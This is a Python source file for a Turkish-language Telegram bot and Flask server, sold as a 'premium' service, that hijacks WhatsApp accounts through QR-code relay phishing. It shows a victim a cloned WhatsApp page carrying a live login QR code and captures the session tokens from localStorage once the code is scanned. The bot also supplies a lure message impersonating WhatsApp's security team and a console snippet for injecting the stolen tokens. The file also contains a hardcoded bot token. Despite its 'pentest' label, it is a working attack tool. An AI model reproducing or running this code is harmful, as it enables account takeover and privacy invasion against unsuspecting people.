import os
import json
import time
import base64
import uuid
import threading
import sqlite3
import logging
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(32)
app.config['SECRET_KEY'] = os.urandom(32)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ===================== VERİTABANI (SQLite) =====================

conn = sqlite3.connect('bot_data.db', check_same_thread=False)
cursor = conn.cursor()

# Tabloları oluştur
cursor.execute('''
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    first_name TEXT,
    premium_until TEXT,
    is_banned INTEGER DEFAULT 0,
    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
    is_lifetime INTEGER DEFAULT 0
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS admins (
    user_id INTEGER PRIMARY KEY
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS links (
    id TEXT PRIMARY KEY,
    user_id INTEGER,
    status TEXT DEFAULT 'waiting',
    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
    tokens TEXT
)
''')

# Admin ekle (bot sahibi)
cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (7497803165)")
conn.commit()

# ===================== VERİTABANI FONKSİYONLARI =====================

def is_admin(user_id):
    cursor.execute("SELECT * FROM admins WHERE user_id = ?", (user_id,))
    return cursor.fetchone() is not None

def is_premium(user_id):
    cursor.execute("SELECT premium_until, is_lifetime, is_banned FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    if not result:
        return False
    premium_until, is_lifetime, is_banned = result
    if is_banned:
        return False
    if is_lifetime:
        return True
    if premium_until:
        try:
            until = datetime.fromisoformat(premium_until)
            if until > datetime.now():
                return True
        except:
            pass
    return False

def is_banned(user_id):
    cursor.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    return result and result[0] == 1

def add_premium_lifetime(user_id, username="", first_name=""):
    cursor.execute("""
        INSERT OR REPLACE INTO users (user_id, username, first_name, is_lifetime, premium_until)
        VALUES (?, ?, ?, 1, 'lifetime')
    """, (user_id, username, first_name))
    conn.commit()

def add_premium_temp(user_id, days=0, hours=0, username="", first_name=""):
    if days > 0:
        until = datetime.now() + timedelta(days=days)
    elif hours > 0:
        until = datetime.now() + timedelta(hours=hours)
    else:
        return
    
    cursor.execute("""
        INSERT OR REPLACE INTO users (user_id, username, first_name, is_lifetime, premium_until)
        VALUES (?, ?, ?, 0, ?)
    """, (user_id, username, first_name, until.isoformat()))
    conn.commit()

def remove_premium(user_id):
    cursor.execute("UPDATE users SET premium_until = NULL, is_lifetime = 0 WHERE user_id = ?", (user_id,))
    conn.commit()

def ban_user(user_id):
    cursor.execute("UPDATE users SET is_banned = 1 WHERE user_id = ?", (user_id,))
    conn.commit()

def unban_user(user_id):
    cursor.execute("UPDATE users SET is_banned = 0 WHERE user_id = ?", (user_id,))
    conn.commit()

def get_user_info(user_id):
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    return cursor.fetchone()

def get_total_users():
    cursor.execute("SELECT COUNT(*) FROM users")
    return cursor.fetchone()[0]

def get_active_premium():
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_lifetime = 1 OR (premium_until IS NOT NULL AND premium_until > datetime('now'))")
    return cursor.fetchone()[0]

def get_banned_users():
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
    return cursor.fetchone()[0]

def save_link(link_id, user_id):
    cursor.execute("INSERT OR REPLACE INTO links (id, user_id) VALUES (?, ?)", (link_id, user_id))
    conn.commit()

def update_link_tokens(link_id, tokens):
    cursor.execute("UPDATE links SET status = 'active', tokens = ? WHERE id = ?", (json.dumps(tokens), link_id))
    conn.commit()

def get_link(link_id):
    cursor.execute("SELECT * FROM links WHERE id = ?", (link_id,))
    return cursor.fetchone()

# ===================== WHATSAPP SESSION =====================

class WhatsAppSessionManager:
    def __init__(self):
        self.driver = None
        self.session_tokens = {}
        self.qr_code_data = None
        self.is_authenticated = False
        self.lock = threading.Lock()
        self.current_link_id = None
    
    def start_browser(self):
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--window-size=1920,1080')
        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            self.driver = webdriver.Chrome(
                service=Service(ChromeDriverManager().install()),
                options=chrome_options
            )
        except:
            chrome_options.binary_location = "/usr/bin/chromium-browser"
            self.driver = webdriver.Chrome(
                service=Service("/usr/lib/chromium-browser/chromedriver"),
                options=chrome_options
            )
        
        logger.info("[+] WhatsApp Web açılıyor...")
        self.driver.get("https://web.whatsapp.com")
        time.sleep(8)
    
    def get_qr_code_data(self):
        try:
            qr_data = self.driver.execute_script("""
                const canvas = document.querySelector('canvas');
                if (!canvas) return null;
                return canvas.toDataURL('image/png');
            """)
            if qr_data:
                self.qr_code_data = qr_data
                return qr_data
        except Exception as e:
            logger.error(f"QR alınamadı: {e}")
        return None
    
    def monitor_session_tokens(self, link_id):
        while not self.is_authenticated:
            try:
                tokens = self.driver.execute_script("""
                    return {
                        'whatsapp-web-encrypted': localStorage.getItem('whatsapp-web-encrypted') || null,
                        'serverToken': localStorage.getItem('serverToken') || null,
                        'clientToken': localStorage.getItem('clientToken') || null,
                        'ref': localStorage.getItem('ref') || null,
                        'wab': localStorage.getItem('wab') || null,
                        'wavid': localStorage.getItem('wavid') || null
                    };
                """)
                
                if tokens.get('serverToken') and tokens.get('clientToken'):
                    with self.lock:
                        self.session_tokens = tokens
                        self.is_authenticated = True
                        update_link_tokens(link_id, tokens)
                    
                    logger.info(f"[+] HEDEF SESSION ELE GEÇİRİLDİ! Link ID: {link_id}")
                    return tokens
            except:
                pass
            time.sleep(2)
    
    def start_monitoring(self, link_id):
        self.current_link_id = link_id
        self.start_browser()
        time.sleep(3)
        qr = self.get_qr_code_data()
        monitor_thread = threading.Thread(target=self.monitor_session_tokens, args=(link_id,), daemon=True)
        monitor_thread.start()
        return qr
    
    def close(self):
        if self.driver:
            self.driver.quit()

pentest = WhatsAppSessionManager()

# ===================== TELEGRAM BOT =====================

BOT_TOKEN = "8665336598:AAEKosBgsibG1BVQK6ECpua2I4Y6p-Wi6Ms"
ADMIN_ID = 7497803165

# ===================== KULLANICI KOMUTLARI =====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    first_name = update.effective_user.first_name or ""
    
    # Ban kontrolü
    if is_banned(user_id):
        await update.message.reply_text("❌ Hesabınız yasaklanmıştır. Yetkiliyle iletişime geçin.")
        return
    
    # Premium kontrolü
    if not is_premium(user_id) and user_id != ADMIN_ID:
        keyboard = [[InlineKeyboardButton("💎 Premium Satın Al", url="https://t.me/admin_ile_iletisim")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "❌ **Bu bot sadece premium kullanıcılara özeldir!**\n\n"
            "Premium üyelik satın almak için aşağıdaki butona tıklayın.\n\n"
            "💎 **Premium Özellikler:**\n"
            "✅ WhatsApp Session Yakalama\n"
            "✅ Sınırsız Link Oluşturma\n"
            "✅ 7/24 Destek",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # Premium kullanıcı veya admin - link oluştur
    link_id = str(uuid.uuid4())[:8]
    base_url = os.environ.get('RENDER_URL', 'http://localhost:5000')
    unique_link = f"{base_url}/qr/{link_id}"
    
    save_link(link_id, user_id)
    
    keyboard = [
        [InlineKeyboardButton("🔗 Linki Kopyala", callback_data=f"copy_{link_id}")],
        [InlineKeyboardButton("📱 Hedefe Gönderilecek Mesaj", callback_data=f"send_{link_id}")],
        [InlineKeyboardButton("🔄 Yeni Link", callback_data="new_link")],
        [InlineKeyboardButton("📊 Durum Kontrol", callback_data=f"status_{link_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"✅ **WhatsApp Pentest Linki Oluşturuldu**\n\n"
        f"🔗 **Link:** `{unique_link}`\n\n"
        f"📌 **Link ID:** `{link_id}`\n\n"
        f"⬇️ Linki hedef kişiye gönder, QR kodu okuttuğunda session otomatik yakalanacak.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    data = query.data
    
    if data.startswith("copy_"):
        link_id = data.replace("copy_", "")
        base_url = os.environ.get('RENDER_URL', 'http://localhost:5000')
        link = f"{base_url}/qr/{link_id}"
        await query.edit_message_text(
            f"📋 **Link kopyalandı:**\n\n`{link}`\n\nHedefe gönderebilirsin.",
            parse_mode='Markdown'
        )
    
    elif data.startswith("send_"):
        link_id = data.replace("send_", "")
        base_url = os.environ.get('RENDER_URL', 'http://localhost:5000')
        link = f"{base_url}/qr/{link_id}"
        await query.edit_message_text(
            f"📤 **Hedefe Gönderilecek Mesaj:**\n\n"
            f"---------------\n"
            f"Merhaba,\n\n"
            f"Güvenlik nedeniyle WhatsApp Web hesabınızı doğrulamanız gerekiyor.\n"
            f"Aşağıdaki linke tıklayıp QR kodu telefonunuzdan okutun:\n\n"
            f"{link}\n\n"
            f"Teşekkürler,\n"
            f"WhatsApp Güvenlik Ekibi\n"
            f"---------------\n\n"
            f"⚠️ Bu metni kopyalayıp hedefe gönder.",
            parse_mode='Markdown'
        )
    
    elif data == "new_link":
        await start(update, context)
    
    elif data.startswith("status_"):
        link_id = data.replace("status_", "")
        link_data = get_link(link_id)
        
        if link_data:
            status = link_data[2]
            if status == 'active':
                tokens = json.loads(link_data[4])
                await query.edit_message_text(
                    f"✅ **HEDEF SESSION ELE GEÇİRİLDİ!**\n\n"
                    f"Link ID: `{link_id}`\n\n"
                    f"Kullanmak için:\n"
                    f"1. WhatsApp Web aç\n"
                    f"2. F12 bas (Console)\n"
                    f"3. Bunu yapıştır:\n\n"
                    f"```javascript\n"
                    f"const t = {json.dumps(tokens)};\n"
                    f"Object.keys(t).forEach(k=>{{if(t[k])localStorage.setItem(k,t[k])}});\n"
                    f"location.reload();\n"
                    f"```",
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text(
                    f"⏳ **Bekleniyor...**\n\n"
                    f"Link ID: `{link_id}`\n"
                    f"Durum: QR kod henüz okutulmadı.\n\n"
                    f"Link: {os.environ.get('RENDER_URL', 'http://localhost:5000')}/qr/{link_id}",
                    parse_mode='Markdown'
                )
        else:
            await query.edit_message_text("❌ Link bulunamadı.")

# ===================== ADMIN KOMUTLARI =====================

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Bu komut sadece admin içindir.")
        return
    
    await update.message.reply_text(
        "👑 **ADMIN KONTROL PANELİ** 👑\n\n"
        "📊 `/toplam` - Toplam kullanıcı sayısı\n"
        "🔍 `/kullanici ID` - Kullanıcı bilgisi sorgula\n"
        "➕ `/ekle ID` - Ömür boyu premium ekle\n"
        "💎 `/vip ID SÜRE` - Süreli premium (örn: `/vip 123 7` gün, `/vip 123 1h` saat)\n"
        "➖ `/sil ID` - Premium kullanıcı sil\n"
        "🚫 `/ban ID` - Kullanıcıyı yasakla\n"
        "🔓 `/unban ID` - Yasağı kaldır\n"
        "📢 `/duyuru mesaj` - Tüm kullanıcılara duyuru gönder\n\n"
        "💡 **Örnekler:**\n"
        "`/ekle 123456789`\n"
        "`/vip 123456789 30`\n"
        "`/vip 123456789 1h`\n"
        "`/duyuru Merhaba arkadaşlar!`",
        parse_mode='Markdown'
    )

async def toplam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Yetkiniz yok.")
        return
    
    total = get_total_users()
    premium = get_active_premium()
    banned = get_banned_users()
    
    await update.message.reply_text(
        f"📊 **İstatistikler**\n\n"
        f"👥 Toplam Kullanıcı: `{total}`\n"
        f"💎 Premium Üye: `{premium}`\n"
        f"🚫 Yasaklı: `{banned}`",
        parse_mode='Markdown'
    )

async def kullanici_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Yetkiniz yok.")
        return
    
    if not context.args:
        await update.message.reply_text("Kullanım: `/kullanici ID`", parse_mode='Markdown')
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("❌ Geçersiz ID.")
        return
    
    user_info = get_user_info(target_id)
    if user_info:
        status = "✅ Premium (Ömür Boyu)" if user_info[5] == 1 else \
                "✅ Premium (Süreli)" if user_info[3] else \
                "❌ Premium Değil"
        
        ban_status = "🚫 Yasaklı" if user_info[4] == 1 else "✅ Temiz"
        
        await update.message.reply_text(
            f"🔍 **Kullanıcı Bilgisi**\n\n"
            f"🆔 ID: `{user_info[0]}`\n"
            f"👤 Kullanıcı Adı: @{user_info[1] or 'Yok'}\n"
            f"📛 İsim: {user_info[2] or 'Yok'}\n"
            f"💎 Durum: {status}\n"
            f"🚫 Ban: {ban_status}\n"
            f"📅 Kayıt: {user_info[6]}",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("❌ Kullanıcı bulunamadı.")

async def ekle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Yetkiniz yok.")
        return
    
    if not context.args:
        await update.message.reply_text("Kullanım: `/ekle ID`", parse_mode='Markdown')
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("❌ Geçersiz ID.")
        return
    
    add_premium_lifetime(target_id)
    await update.message.reply_text(f"✅ `{target_id}` kullanıcısına **ÖMÜR BOYU** premium verildi!", parse_mode='Markdown')

async def vip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Yetkiniz yok.")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "Kullanım:\n"
            "`/vip ID GUN` (örn: `/vip 123 7` - 7 gün)\n"
            "`/vip ID SAAT` (örn: `/vip 123 1h` - 1 saat)",
            parse_mode='Markdown'
        )
        return
    
    try:
        target_id = int(context.args[0])
        sure = context.args[1]
        
        if sure.endswith('h'):
            hours = int(sure.replace('h', ''))
            add_premium_temp(target_id, hours=hours)
            await update.message.reply_text(f"✅ `{target_id}` kullanıcısına **{hours} saatlik** premium verildi!", parse_mode='Markdown')
        else:
            days = int(sure)
            add_premium_temp(target_id, days=days)
            await update.message.reply_text(f"✅ `{target_id}` kullanıcısına **{days} günlük** premium verildi!", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Geçersiz format. Örn: `/vip 123 7` veya `/vip 123 1h`")

async def sil_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Yetkiniz yok.")
        return
    
    if not context.args:
        await update.message.reply_text("Kullanım: `/sil ID`", parse_mode='Markdown')
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("❌ Geçersiz ID.")
        return
    
    remove_premium(target_id)
    await update.message.reply_text(f"✅ `{target_id}` kullanıcısının premiumu silindi!", parse_mode='Markdown')

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Yetkiniz yok.")
        return
    
    if not context.args:
        await update.message.reply_text("Kullanım: `/ban ID`", parse_mode='Markdown')
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("❌ Geçersiz ID.")
        return
    
    ban_user(target_id)
    await update.message.reply_text(f"🚫 `{target_id}` kullanıcısı yasaklandı!", parse_mode='Markdown')

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Yetkiniz yok.")
        return
    
    if not context.args:
        await update.message.reply_text("Kullanım: `/unban ID`", parse_mode='Markdown')
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("❌ Geçersiz ID.")
        return
    
    unban_user(target_id)
    await update.message.reply_text(f"🔓 `{target_id}` kullanıcısının yasağı kaldırıldı!", parse_mode='Markdown')

async def duyuru_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Yetkiniz yok.")
        return
    
    if not context.args:
        await update.message.reply_text("Kullanım: `/duyuru mesaj`", parse_mode='Markdown')
        return
    
    mesaj = " ".join(context.args)
    
    # Tüm kullanıcılara mesaj gönder
    cursor.execute("SELECT user_id FROM users WHERE is_banned = 0")
    users = cursor.fetchall()
    
    sent = 0
    failed = 0
    
    for (uid,) in users:
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=f"📢 **DUYURU** 📢\n\n{mesaj}\n\n-- Admin",
                parse_mode='Markdown'
            )
            sent += 1
            time.sleep(0.05)  # Rate limiting
        except:
            failed += 1
    
    await update.message.reply_text(
        f"✅ **Duyuru Gönderildi!**\n\n"
        f"📤 Gönderilen: `{sent}`\n"
        f"❌ Başarısız: `{failed}`\n"
        f"👥 Toplam: `{len(users)}`",
        parse_mode='Markdown'
    )

# ===================== FLASK ROUTES =====================

@app.route('/')
def index():
    return render_template('whatsapp_clone.html')

@app.route('/qr/<link_id>')
def qr_page(link_id):
    link_data = get_link(link_id)
    if not link_data:
        return "Link geçersiz veya süresi dolmuş.", 404
    return render_template('whatsapp_clone.html', link_id=link_id)

@app.route('/api/qr-code/<link_id>')
def get_qr_code(link_id):
    link_data = get_link(link_id)
    if not link_data:
        return jsonify({'error': 'Geçersiz link'}), 404
    
    if link_data[2] == 'waiting':
        if not hasattr(get_qr_code, 'session_started'):
            get_qr_code.session_started = {}
        
        if link_id not in get_qr_code.session_started:
            get_qr_code.session_started[link_id] = True
            pentest.session_tokens = {}
            pentest.is_authenticated = False
            thread = threading.Thread(target=pentest.start_monitoring, args=(link_id,), daemon=True)
            thread.start()
            time.sleep(5)
    
    if pentest.qr_code_data:
        return jsonify({'status': 'success', 'qr': pentest.qr_code_data})
    return jsonify({'status': 'loading'})

@app.route('/api/check-session/<link_id>')
def check_session(link_id):
    link_data = get_link(link_id)
    if link_data and link_data[2] == 'active':
        return jsonify({
            'status': 'success',
            'message': 'QR kod tarandı! Hesap ele geçirildi.',
            'tokens': json.loads(link_data[4])
        })
    return jsonify({'status': 'waiting'})

# ===================== MAIN =====================

def run_telegram_bot():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Kullanıcı komutları
    application.add_handler(CommandHandler("start", start))
    
    # Admin komutları
    application.add_handler(CommandHandler("admin", admin_panel))
    application.add_handler(CommandHandler("panel", admin_panel))
    application.add_handler(CommandHandler("toplam", toplam_command))
    application.add_handler(CommandHandler("kullanici", kullanici_command))
    application.add_handler(CommandHandler("ekle", ekle_command))
    application.add_handler(CommandHandler("vip", vip_command))
    application.add_handler(CommandHandler("sil", sil_command))
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(CommandHandler("duyuru", duyuru_command))
    
    # Buton handler
    application.add_handler(CallbackQueryHandler(button_handler))
    
    logger.info("[+] Telegram bot başlatıldı!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    try:
        # Telegram bot thread'i
        bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
        bot_thread.start()
        
        port = int(os.environ.get('PORT', 5000))
        logger.info(f"[*] Pentest sunucusu: http://0.0.0.0:{port}")
        socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
    except KeyboardInterrupt:
        pentest.close()